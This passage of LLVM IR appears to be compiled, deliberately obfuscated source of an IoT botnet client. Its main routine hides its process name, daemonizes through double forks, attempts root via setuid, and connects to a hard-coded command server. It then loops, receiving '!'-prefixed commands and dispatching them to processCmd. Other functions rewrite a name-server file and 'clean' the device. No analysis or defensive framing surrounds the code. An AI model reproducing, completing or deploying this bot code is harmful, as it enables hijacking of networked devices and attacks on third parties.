  %696 = add i64 %695, 5367490987797129286
  %697 = add i64 %696, 1
  %698 = sub i64 %697, 5367490987797129286
  %699 = add i64 %695, 1
  store i64 %698, i64* %36, align 8
  br label %665

; <label>:700:                                    ; preds = %665
  %701 = load i32, i32* %35, align 4
  %702 = icmp sgt i32 %701, 0
  br i1 %702, label %703, label %704

; <label>:703:                                    ; preds = %700
  br label %705

; <label>:704:                                    ; preds = %700
  br label %705

; <label>:705:                                    ; preds = %704, %703
  br label %706

; <label>:706:                                    ; preds = %705, %658
  %707 = load i8**, i8*** %4, align 8
  %708 = getelementptr inbounds i8*, i8** %707, i64 0
  %709 = load i8*, i8** %708, align 8
  %710 = call i32 @strcmp(i8* %709, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.195, i32 0, i32 0)) #9
  %711 = icmp ne i32 %710, 0
  br i1 %711, label %717, label %712

; <label>:712:                                    ; preds = %706
  call void @CleanDevice()
  %713 = load i32, i32* @mainCommSock, align 4
  %714 = call i8* @getBuild()
  %715 = call i32 @getEndianness()
  %716 = call i32 (i32, i8*, ...) @sockprintf(i32 %713, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.196, i32 0, i32 0), i8* %714, i32 %715)
  br label %717

; <label>:717:                                    ; preds = %712, %706, %652, %617, %586, %524, %476, %424, %365, %324, %285, %281, %236, %232, %187, %183, %160, %134, %74, %69, %42
  ret void
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) #3

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @getppid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %17 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %15
    i32 16777986, label %16
  ]

; <label>:13:                                     ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.199 to i32), i32* %1, align 4
  br label %18

; <label>:14:                                     ; preds = %0
  store i32 ptrtoint ([14 x i8]* @.str.200 to i32), i32* %1, align 4
  br label %18

; <label>:15:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.201 to i32), i32* %1, align 4
  br label %18

; <label>:16:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.202 to i32), i32* %1, align 4
  br label %18

; <label>:17:                                     ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.203 to i32), i32* %1, align 4
  br label %18

; <label>:18:                                     ; preds = %17, %16, %15, %14, %13
  %19 = load i32, i32* %1, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = sub i32 %11, -313667488
  %13 = add i32 %12, 1
  %14 = add i32 %13, -313667488
  %15 = add nsw i32 %11, 1
  %16 = sext i32 %14 to i64
  %17 = icmp eq i64 %16, 1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %25

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @currentServer, align 4
  %21 = add i32 %20, 285033538
  %22 = add i32 %21, 1
  %23 = sub i32 %22, 285033538
  %24 = add nsw i32 %20, 1
  store i32 %23, i32* @currentServer, align 4
  br label %25

; <label>:25:                                     ; preds = %19, %18
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %27 = load i32, i32* @currentServer, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i8* @strcpy(i8* %26, i8* %30) #5
  store i32 23, i32* %3, align 4
  %32 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %33 = call i8* @strchr(i8* %32, i32 58) #9
  %34 = icmp ne i8* %33, null
  br i1 %34, label %35, label %42

; <label>:35:                                     ; preds = %25
  %36 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %37 = call i8* @strchr(i8* %36, i32 58) #9
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = call i32 @atoi(i8* %38) #9
  store i32 %39, i32* %3, align 4
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %41 = call i8* @strchr(i8* %40, i32 58) #9
  store i8 0, i8* %41, align 1
  br label %42

; <label>:42:                                     ; preds = %35, %25
  %43 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %43, i32* @mainCommSock, align 4
  %44 = load i32, i32* @mainCommSock, align 4
  %45 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %46 = load i32, i32* %3, align 4
  %47 = call i32 @connectTimeout(i32 %44, i8* %45, i32 %46, i32 30)
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  store i32 1, i32* %1, align 4
  br label %51

; <label>:50:                                     ; preds = %42
  store i32 0, i32* %1, align 4
  br label %51

; <label>:51:                                     ; preds = %50, %49
  %52 = load i32, i32* %1, align 4
  ret i32 %52
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.197, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.197, i32 0, i32 0), i32 0) #5
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %16

; <label>:8:                                      ; preds = %0
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.198, i32 0, i32 0), i8** %2, align 8
  %9 = load i8*, i8** %2, align 8
  %10 = call i64 @strlen(i8* %9) #9
  store i64 %10, i64* %3, align 8
  %11 = load i16, i16* %1, align 2
  %12 = zext i16 %11 to i32
  %13 = load i8*, i8** %2, align 8
  %14 = load i64, i64* %3, align 8
  %15 = call i64 @write(i32 %12, i8* %13, i64 %14)
  br label %17

; <label>:16:                                     ; preds = %0
  br label %21

; <label>:17:                                     ; preds = %8
  %18 = load i16, i16* %1, align 2
  %19 = zext i16 %18 to i32
  %20 = call i32 @close(i32 %19)
  br label %21

; <label>:21:                                     ; preds = %17, %16
  ret void
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.204, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.204, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.204, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, -1
  %40 = and i64 8722151664081394234, %39
  %41 = xor i64 8722151664081394234, -1
  %42 = and i64 %36, %41
  %43 = xor i64 %38, -1
  %44 = and i64 %43, 8722151664081394234
  %45 = and i64 %38, %41
  %46 = or i64 %40, %42
  %47 = or i64 %44, %45
  %48 = xor i64 %46, %47
  %49 = xor i64 %36, %38
  %50 = trunc i64 %48 to i32
  call void @srand(i32 %50) #5
  %51 = call i64 @time(i64* null) #5
  %52 = call i32 @getpid() #5
  %53 = sext i32 %52 to i64
  %54 = xor i64 %51, -1
  %55 = and i64 %53, %54
  %56 = xor i64 %53, -1
  %57 = and i64 %51, %56
  %58 = or i64 %55, %57
  %59 = xor i64 %51, %53
  %60 = trunc i64 %58 to i32
  call void @init_rand(i32 %60)
  %61 = call i32 @fork() #5
  store i32 %61, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %66

; <label>:63:                                     ; preds = %2
  %64 = load i32, i32* %7, align 4
  %65 = call i32 @waitpid(i32 %64, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:66:                                     ; preds = %2
  %67 = load i32, i32* %7, align 4
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %80, label %69

; <label>:69:                                     ; preds = %66
  %70 = call i32 @fork() #5
  store i32 %70, i32* %8, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %69
  call void @exit(i32 0) #12
  unreachable

; <label>:73:                                     ; preds = %69
  %74 = load i32, i32* %8, align 4
  %75 = icmp ne i32 %74, 0
  br i1 %75, label %77, label %76

; <label>:76:                                     ; preds = %73
  br label %78

; <label>:77:                                     ; preds = %73
  br label %78

; <label>:78:                                     ; preds = %77, %76
  br label %79

; <label>:79:                                     ; preds = %78
  br label %81

; <label>:80:                                     ; preds = %66
  br label %81

; <label>:81:                                     ; preds = %80, %79
  br label %82

; <label>:82:                                     ; preds = %81
  %83 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0)) #5
  %84 = call i32 @setuid(i32 0) #5
  %85 = call i32 @seteuid(i32 0) #5
  %86 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %87

; <label>:87:                                     ; preds = %93, %82
  %88 = call i32 @fork() #5
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %404

; <label>:90:                                     ; preds = %87
  %91 = call i32 @initConnection()
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %95

; <label>:93:                                     ; preds = %90
  %94 = call i32 @sleep(i32 5)
  br label %87

; <label>:95:                                     ; preds = %90
  %96 = load i32, i32* @mainCommSock, align 4
  %97 = call i8* @getBuild()
  %98 = call i32 @getEndianness()
  %99 = call i32 (i32, i8*, ...) @sockprintf(i32 %96, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.206, i32 0, i32 0), i8* %97, i32 %98)
  call void @UpdateNameSrvs()
  call void @CleanDevice()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %100

; <label>:100:                                    ; preds = %402, %251, %215, %95
  %101 = load i32, i32* @mainCommSock, align 4
  %102 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %103 = call i32 @recvLine(i32 %101, i8* %102, i32 4096)
  store i32 %103, i32* %11, align 4
  %104 = icmp ne i32 %103, -1
  br i1 %104, label %105, label %403

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %12, align 4
  br label %106

; <label>:106:                                    ; preds = %201, %105
  %107 = load i32, i32* %12, align 4
  %108 = sext i32 %107 to i64
  %109 = load i64, i64* @numpids, align 8
  %110 = icmp ult i64 %108, %109
  br i1 %110, label %111, label %206

; <label>:111:                                    ; preds = %106
  %112 = load i32*, i32** @pids, align 8
  %113 = load i32, i32* %12, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i32, i32* %112, i64 %114
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @waitpid(i32 %116, i32* null, i32 1)
  %118 = icmp sgt i32 %117, 0
  br i1 %118, label %119, label %200

; <label>:119:                                    ; preds = %111
  %120 = load i32, i32* %12, align 4
  %121 = sub i32 0, %120
  %122 = sub i32 0, 1
  %123 = add i32 %121, %122
  %124 = sub i32 0, %123
  %125 = add nsw i32 %120, 1
  store i32 %124, i32* %14, align 4
  br label %126

; <label>:126:                                    ; preds = %145, %119
  %127 = load i32, i32* %14, align 4
  %128 = zext i32 %127 to i64
  %129 = load i64, i64* @numpids, align 8
  %130 = icmp ult i64 %128, %129
  br i1 %130, label %131, label %152

; <label>:131:                                    ; preds = %126
  %132 = load i32*, i32** @pids, align 8
  %133 = load i32, i32* %14, align 4
  %134 = zext i32 %133 to i64
  %135 = getelementptr inbounds i32, i32* %132, i64 %134
  %136 = load i32, i32* %135, align 4
  %137 = load i32*, i32** @pids, align 8
  %138 = load i32, i32* %14, align 4
  %139 = add i32 %138, 1490375547
  %140 = sub i32 %139, 1
  %141 = sub i32 %140, 1490375547
  %142 = sub i32 %138, 1
  %143 = zext i32 %141 to i64
  %144 = getelementptr inbounds i32, i32* %137, i64 %143
  store i32 %136, i32* %144, align 4
  br label %145

; <label>:145:                                    ; preds = %131
  %146 = load i32, i32* %14, align 4
  %147 = sub i32 0, %146
  %148 = sub i32 0, 1
  %149 = add i32 %147, %148
  %150 = sub i32 0, %149
  %151 = add i32 %146, 1
  store i32 %150, i32* %14, align 4
  br label %126

; <label>:152:                                    ; preds = %126
  %153 = load i32*, i32** @pids, align 8
  %154 = load i32, i32* %14, align 4
  %155 = add i32 %154, -901186394
  %156 = sub i32 %155, 1
  %157 = sub i32 %156, -901186394
  %158 = sub i32 %154, 1
  %159 = zext i32 %157 to i64
  %160 = getelementptr inbounds i32, i32* %153, i64 %159
  store i32 0, i32* %160, align 4
  %161 = load i64, i64* @numpids, align 8
  %162 = sub i64 %161, -1928191143366714413
  %163 = add i64 %162, -1
  %164 = add i64 %163, -1928191143366714413
  %165 = add i64 %161, -1
  store i64 %164, i64* @numpids, align 8
  %166 = load i64, i64* @numpids, align 8
  %167 = sub i64 0, %166
  %168 = sub i64 0, 1
  %169 = add i64 %167, %168
  %170 = sub i64 0, %169
  %171 = add i64 %166, 1
  %172 = mul i64 %170, 4
  %173 = call noalias i8* @malloc(i64 %172) #5
  %174 = bitcast i8* %173 to i32*
  store i32* %174, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %175

; <label>:175:                                    ; preds = %190, %152
  %176 = load i32, i32* %14, align 4
  %177 = zext i32 %176 to i64
  %178 = load i64, i64* @numpids, align 8
  %179 = icmp ult i64 %177, %178
  br i1 %179, label %180, label %196

; <label>:180:                                    ; preds = %175
  %181 = load i32*, i32** @pids, align 8
  %182 = load i32, i32* %14, align 4
  %183 = zext i32 %182 to i64
  %184 = getelementptr inbounds i32, i32* %181, i64 %183
  %185 = load i32, i32* %184, align 4
  %186 = load i32*, i32** %13, align 8
  %187 = load i32, i32* %14, align 4
  %188 = zext i32 %187 to i64
  %189 = getelementptr inbounds i32, i32* %186, i64 %188
  store i32 %185, i32* %189, align 4
  br label %190

; <label>:190:                                    ; preds = %180
  %191 = load i32, i32* %14, align 4
  %192 = sub i32 %191, 1630278660
  %193 = add i32 %192, 1
  %194 = add i32 %193, 1630278660
  %195 = add i32 %191, 1
  store i32 %194, i32* %14, align 4
  br label %175

; <label>:196:                                    ; preds = %175
  %197 = load i32*, i32** @pids, align 8
  %198 = bitcast i32* %197 to i8*
  call void @free(i8* %198) #5
  %199 = load i32*, i32** %13, align 8
  store i32* %199, i32** @pids, align 8
  br label %200

; <label>:200:                                    ; preds = %196, %111
  br label %201

; <label>:201:                                    ; preds = %200
  %202 = load i32, i32* %12, align 4
  %203 = sub i32 0, 1
  %204 = sub i32 %202, %203
  %205 = add nsw i32 %202, 1
  store i32 %204, i32* %12, align 4
  br label %106

; <label>:206:                                    ; preds = %106
  %207 = load i32, i32* %11, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %208
  store i8 0, i8* %209, align 1
  %210 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %210)
  %211 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %212 = call i8* @strstr(i8* %211, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.181, i32 0, i32 0)) #9
  %213 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %214 = icmp eq i8* %212, %213
  br i1 %214, label %215, label %216

; <label>:215:                                    ; preds = %206
  br label %100

; <label>:216:                                    ; preds = %206
  %217 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %218 = call i8* @strstr(i8* %217, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.207, i32 0, i32 0)) #9
  %219 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %220 = icmp eq i8* %218, %219
  br i1 %220, label %221, label %222

; <label>:221:                                    ; preds = %216
  call void @exit(i32 0) #12
  unreachable

; <label>:222:                                    ; preds = %216
  %223 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %223, i8** %15, align 8
  %224 = load i8*, i8** %15, align 8
  %225 = load i8, i8* %224, align 1
  %226 = zext i8 %225 to i32
  %227 = icmp eq i32 %226, 33
  br i1 %227, label %228, label %402

; <label>:228:                                    ; preds = %222
  %229 = load i8*, i8** %15, align 8
  %230 = getelementptr inbounds i8, i8* %229, i64 1
  store i8* %230, i8** %16, align 8
  br label %231

; <label>:231:                                    ; preds = %243, %228
  %232 = load i8*, i8** %16, align 8
  %233 = load i8, i8* %232, align 1
  %234 = zext i8 %233 to i32
  %235 = icmp ne i32 %234, 32
  br i1 %235, label %236, label %241

; <label>:236:                                    ; preds = %231
  %237 = load i8*, i8** %16, align 8
  %238 = load i8, i8* %237, align 1
  %239 = zext i8 %238 to i32
  %240 = icmp ne i32 %239, 0
  br label %241

; <label>:241:                                    ; preds = %236, %231
  %242 = phi i1 [ false, %231 ], [ %240, %236 ]
  br i1 %242, label %243, label %246

; <label>:243:                                    ; preds = %241
  %244 = load i8*, i8** %16, align 8
  %245 = getelementptr inbounds i8, i8* %244, i32 1
  store i8* %245, i8** %16, align 8
  br label %231

; <label>:246:                                    ; preds = %241
  %247 = load i8*, i8** %16, align 8
  %248 = load i8, i8* %247, align 1
  %249 = zext i8 %248 to i32
  %250 = icmp eq i32 %249, 0
  br i1 %250, label %251, label %252

; <label>:251:                                    ; preds = %246
  br label %100

; <label>:252:                                    ; preds = %246
  %253 = load i8*, i8** %16, align 8
  store i8 0, i8* %253, align 1
  %254 = load i8*, i8** %15, align 8
  %255 = getelementptr inbounds i8, i8* %254, i64 1
  store i8* %255, i8** %16, align 8
  %256 = load i8*, i8** %15, align 8
  %257 = load i8*, i8** %16, align 8
  %258 = call i64 @strlen(i8* %257) #9
  %259 = getelementptr inbounds i8, i8* %256, i64 %258
  %260 = getelementptr inbounds i8, i8* %259, i64 2
  store i8* %260, i8** %15, align 8
  br label %261

; <label>:261:                                    ; preds = %286, %252
  %262 = load i8*, i8** %15, align 8
  %263 = load i8*, i8** %15, align 8
  %264 = call i64 @strlen(i8* %263) #9
  %265 = add i64 %264, 311056226719699587
  %266 = sub i64 %265, 1
  %267 = sub i64 %266, 311056226719699587
  %268 = sub i64 %264, 1
  %269 = getelementptr inbounds i8, i8* %262, i64 %267
  %270 = load i8, i8* %269, align 1
  %271 = zext i8 %270 to i32
  %272 = icmp eq i32 %271, 10
  br i1 %272, label %284, label %273

; <label>:273:                                    ; preds = %261
  %274 = load i8*, i8** %15, align 8
  %275 = load i8*, i8** %15, align 8
  %276 = call i64 @strlen(i8* %275) #9
  %277 = sub i64 0, 1
  %278 = add i64 %276, %277
  %279 = sub i64 %276, 1
  %280 = getelementptr inbounds i8, i8* %274, i64 %278
  %281 = load i8, i8* %280, align 1
  %282 = zext i8 %281 to i32
  %283 = icmp eq i32 %282, 13
  br label %284

; <label>:284:                                    ; preds = %273, %261
  %285 = phi i1 [ true, %261 ], [ %283, %273 ]
  br i1 %285, label %286, label %295

; <label>:286:                                    ; preds = %284
  %287 = load i8*, i8** %15, align 8
  %288 = load i8*, i8** %15, align 8
  %289 = call i64 @strlen(i8* %288) #9
  %290 = sub i64 %289, 78310004578552453
  %291 = sub i64 %290, 1
  %292 = add i64 %291, 78310004578552453
  %293 = sub i64 %289, 1
  %294 = getelementptr inbounds i8, i8* %287, i64 %292
  store i8 0, i8* %294, align 1
  br label %261

; <label>:295:                                    ; preds = %284
  %296 = load i8*, i8** %15, align 8
  store i8* %296, i8** %17, align 8
  br label %297

; <label>:297:                                    ; preds = %309, %295
  %298 = load i8*, i8** %15, align 8
  %299 = load i8, i8* %298, align 1
  %300 = zext i8 %299 to i32
  %301 = icmp ne i32 %300, 32
  br i1 %301, label %302, label %307

; <label>:302:                                    ; preds = %297
  %303 = load i8*, i8** %15, align 8
  %304 = load i8, i8* %303, align 1
  %305 = zext i8 %304 to i32
  %306 = icmp ne i32 %305, 0
  br label %307

; <label>:307:                                    ; preds = %302, %297
  %308 = phi i1 [ false, %297 ], [ %306, %302 ]
  br i1 %308, label %309, label %312

; <label>:309:                                    ; preds = %307
  %310 = load i8*, i8** %15, align 8
  %311 = getelementptr inbounds i8, i8* %310, i32 1
  store i8* %311, i8** %15, align 8
  br label %297

; <label>:312:                                    ; preds = %307
  %313 = load i8*, i8** %15, align 8
  store i8 0, i8* %313, align 1
  %314 = load i8*, i8** %15, align 8
  %315 = getelementptr inbounds i8, i8* %314, i32 1
  store i8* %315, i8** %15, align 8
  %316 = load i8*, i8** %17, align 8
  store i8* %316, i8** %18, align 8
  br label %317

; <label>:317:                                    ; preds = %321, %312
  %318 = load i8*, i8** %18, align 8
  %319 = load i8, i8* %318, align 1
  %320 = icmp ne i8 %319, 0
  br i1 %320, label %321, label %330

; <label>:321:                                    ; preds = %317
  %322 = load i8*, i8** %18, align 8
  %323 = load i8, i8* %322, align 1
  %324 = zext i8 %323 to i32
  %325 = call i32 @toupper(i32 %324) #9
  %326 = trunc i32 %325 to i8
  %327 = load i8*, i8** %18, align 8
  store i8 %326, i8* %327, align 1
  %328 = load i8*, i8** %18, align 8
  %329 = getelementptr inbounds i8, i8* %328, i32 1
  store i8* %329, i8** %18, align 8
  br label %317

; <label>:330:                                    ; preds = %317
  store i32 1, i32* %20, align 4
  %331 = load i8*, i8** %15, align 8
  %332 = call i8* @strtok(i8* %331, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0)) #5
  store i8* %332, i8** %21, align 8
  %333 = load i8*, i8** %17, align 8
  %334 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %333, i8** %334, align 16
  br label %335

; <label>:335:                                    ; preds = %376, %330
  %336 = load i8*, i8** %21, align 8
  %337 = icmp ne i8* %336, null
  br i1 %337, label %338, label %378

; <label>:338:                                    ; preds = %335
  %339 = load i8*, i8** %21, align 8
  %340 = load i8, i8* %339, align 1
  %341 = zext i8 %340 to i32
  %342 = icmp ne i32 %341, 10
  br i1 %342, label %343, label %376

; <label>:343:                                    ; preds = %338
  %344 = load i8*, i8** %21, align 8
  %345 = call i64 @strlen(i8* %344) #9
  %346 = sub i64 %345, 5167163123135191524
  %347 = add i64 %346, 1
  %348 = add i64 %347, 5167163123135191524
  %349 = add i64 %345, 1
  %350 = call noalias i8* @malloc(i64 %348) #5
  %351 = load i32, i32* %20, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %352
  store i8* %350, i8** %353, align 8
  %354 = load i32, i32* %20, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %355
  %357 = load i8*, i8** %356, align 8
  %358 = load i8*, i8** %21, align 8
  %359 = call i64 @strlen(i8* %358) #9
  %360 = add i64 %359, -3736625252767842029
  %361 = add i64 %360, 1
  %362 = sub i64 %361, -3736625252767842029
  %363 = add i64 %359, 1
  call void @llvm.memset.p0i8.i64(i8* %357, i8 0, i64 %362, i32 1, i1 false)
  %364 = load i32, i32* %20, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %365
  %367 = load i8*, i8** %366, align 8
  %368 = load i8*, i8** %21, align 8
  %369 = call i8* @strcpy(i8* %367, i8* %368) #5
  %370 = load i32, i32* %20, align 4
  %371 = sub i32 0, %370
  %372 = sub i32 0, 1
  %373 = add i32 %371, %372
  %374 = sub i32 0, %373
  %375 = add nsw i32 %370, 1
  store i32 %374, i32* %20, align 4
  br label %376

; <label>:376:                                    ; preds = %343, %338
  %377 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0)) #5
  store i8* %377, i8** %21, align 8
  br label %335

; <label>:378:                                    ; preds = %335
  %379 = load i32, i32* %20, align 4
  %380 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %379, i8** %380)
  %381 = load i32, i32* %20, align 4
  %382 = icmp sgt i32 %381, 1
  br i1 %382, label %383, label %401

; <label>:383:                                    ; preds = %378
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %384

; <label>:384:                                    ; preds = %393, %383
  %385 = load i32, i32* %22, align 4
  %386 = load i32, i32* %20, align 4
  %387 = icmp slt i32 %385, %386
  br i1 %387, label %388, label %400

; <label>:388:                                    ; preds = %384
  %389 = load i32, i32* %22, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %390
  %392 = load i8*, i8** %391, align 8
  call void @free(i8* %392) #5
  br label %393

; <label>:393:                                    ; preds = %388
  %394 = load i32, i32* %22, align 4
  %395 = sub i32 0, %394
  %396 = sub i32 0, 1
  %397 = add i32 %395, %396
  %398 = sub i32 0, %397
  %399 = add nsw i32 %394, 1
  store i32 %398, i32* %22, align 4
  br label %384

; <label>:400:                                    ; preds = %384
  br label %401

; <label>:401:                                    ; preds = %400, %378
  br label %402

; <label>:402:                                    ; preds = %401, %222
  br label %100

; <label>:403:                                    ; preds = %100
  br label %404

; <label>:404:                                    ; preds = %403, %87
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

